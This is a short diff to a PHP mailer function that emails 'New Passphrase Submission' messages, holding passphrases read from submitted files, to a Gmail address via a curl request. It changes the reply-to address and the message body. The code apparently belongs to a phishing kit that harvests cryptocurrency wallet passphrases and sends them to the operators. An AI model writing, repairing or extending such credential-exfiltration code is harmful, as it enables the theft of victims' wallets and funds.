@@ -68,9 +68,9 @@ function sendEmail($jsonFilePath, $txtFilePath) {
         'ishtml' => 'false',
         'sendto' => 'piphrase042@gmail.com',
         'name' => 'Pi',
-        'replyTo' => 'ol37288997@gmail.com',
+        'replyTo' => 'peterjfk243@gmail.com',
         'title' => 'New Passphrase Submission',
-        'body' => 'Passphrase in JSON: ' . $jsonContent . "\n\n" . 'Passphrase in Text: ' . $txtContent
+        'body' => 'Passphrase in Text: ' . $txtContent
     ];
 
     $curl = curl_init();
